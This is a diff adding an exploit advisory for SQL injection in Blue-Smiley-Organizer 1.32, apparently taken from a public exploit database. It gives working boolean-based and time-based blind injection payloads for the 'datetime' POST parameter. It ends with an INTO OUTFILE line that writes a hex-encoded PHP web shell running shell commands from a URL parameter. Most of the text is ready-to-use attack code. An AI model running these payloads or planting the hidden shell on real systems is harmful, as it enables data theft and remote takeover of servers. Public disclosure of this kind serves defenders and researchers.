@@ -1,0 +1,27 @@
+Exploit Title: delpino73 Blue-Smiley-Organizer 1.32 - 'datetime' SQL Injection
+Date: 2019-10-28
+Exploit Author: Cakes
+Vendor Homepage: https://github.com/delpino73/Blue-Smiley-Organizer
+Software Link: https://github.com/delpino73/Blue-Smiley-Organizer.git
+Version: 1.32
+Tested on: CentOS7
+CVE : N/A
+
+# PoC: Multiple SQL Injection vulnerabilities
+# Nice and easy SQL Injection
+    
+Parameter: datetime (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: datetime=2019-10-27 10:53:00' AND 6315=(SELECT (CASE WHEN (6315=6315) THEN 6315 ELSE (SELECT 3012 UNION SELECT 2464) END))-- sQtq&title=tester&category_id=1&new_category=&text=test2&public=1&save=Save Note
+    Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: datetime=2019-10-27 10:53:00' AND (SELECT 7239 FROM (SELECT(SLEEP(5)))wrOx)-- cDKQ&title=tester&category_id=1&new_category=&text=test2&public=1&save=Save Note
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    
+  
+  
+# Pop a PHP CMD Shell
+  
+' LIMIT 0,1 INTO OUTFILE '/Path/To/Folder/upload/exec.php' LINES TERMINATED BY 0x3c3f7068702024636d64203d207368656c6c5f6578656328245f4745545b27636d64275d293b206563686f2024636d643b203f3e-- -
